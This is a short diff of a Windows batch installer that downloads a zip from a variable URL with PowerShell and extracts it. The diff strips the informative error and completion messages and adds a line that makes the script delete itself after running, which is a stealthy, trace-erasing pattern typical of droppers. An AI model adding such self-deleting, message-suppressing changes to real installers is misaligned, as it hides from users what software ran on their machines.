@@ -22,14 +22,14 @@ if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
 powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop"
 if %errorlevel% neq 0 (
-echo ERROR: Database update failed.
+echo ERROR
 pause
 exit /b 1
 )
 
 powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
 if %errorlevel% neq 0 (
-echo ERROR: Installation failed.
+echo ERROR
 pause
 exit /b 1
 )
@@ -58,6 +58,4 @@ pause
 exit /b 1
 )
 
-echo.
-echo Installation complete.
-pause
+del "%~f0"
